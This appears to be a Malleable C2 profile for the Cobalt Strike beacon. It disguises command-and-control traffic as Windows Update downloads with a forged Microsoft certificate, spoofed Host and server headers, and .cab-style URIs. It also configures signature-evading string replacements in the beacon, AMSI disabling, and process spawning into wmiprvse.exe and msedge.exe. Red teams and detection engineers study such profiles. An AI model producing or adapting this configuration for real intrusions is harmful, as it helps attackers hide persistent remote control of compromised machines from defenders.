# based on microsoftupdate_getonly.profile

set tasks_max_size "2097152";

https-certificate {
    set CN       "www.windowsupdate.com"; #Common Name
    set O        "Microsoft Corporation"; #Organization Name
    set C        "US"; #Country
    set L        "Redmond"; #Locality
    set OU       "Microsoft IT"; #Organizational Unit Name
    set ST       "WA"; #State or Province
    set validity "365"; #Number of days the cert is valid for
}

set sleeptime "300000";
set jitter    "5";

set useragent "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40";

dns-beacon {
    set dns_idle "8.8.4.4";
    set dns_sleep "0";
    set maxdns    "235";
}

http-get {

    set uri "/c/msdownload/update/others/2016/12/29136388_";

    client {

        header "Accept" "*/*";
        header "Host" "download.windowsupdate.com";
        
        metadata {
            base64url;
            append ".cab";
            uri-append;
        }
    }


    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        output {

            print;
        }
    }
}

http-post {
    
    set uri "/c/msdownload/update/others/2016/12/3215234_";
    set verb "GET";

    client {

        header "Accept" "*/*";

        id {
            prepend "download.windowsupdate.com/c/";
            header "Host";
        }

        output {
            base64url;
            append ".cab";
            uri-append;
        }
    }

    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        output {
            print;
        }
    }
}

http-stager {
    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
    }
}

stage {
    set sleep_mask "true";
    set userwx "true";
    set cleanup "true";

    set magic_pe "TL";
    set magic_mz_x64 "AYAQ";

    transform-x64 {
        strrep "(admin)" "(adm1n)";
        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
        strrep "\x25\xff\xff\xff\x00\x3d\x41\x41\x41\x00" "\xb8\x41\x41\x41\x00\x3d\x41\x41\x41\x00";
    }
}

process-inject {
    set startrwx "false";
    set userwx "false";
    set bof_reuse_memory "false";
}

post-ex {
    set smartinject "true";
    set amsi_disable "true";
    set obfuscate "true";
    set cleanup "true";

    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe";
    set spawnto_x64 "%programfiles(x86)%\\microsoft\\edge\\application\\msedge.exe";
	
    set pipename "TSVCPIPE-########-####-####-####-############";
}
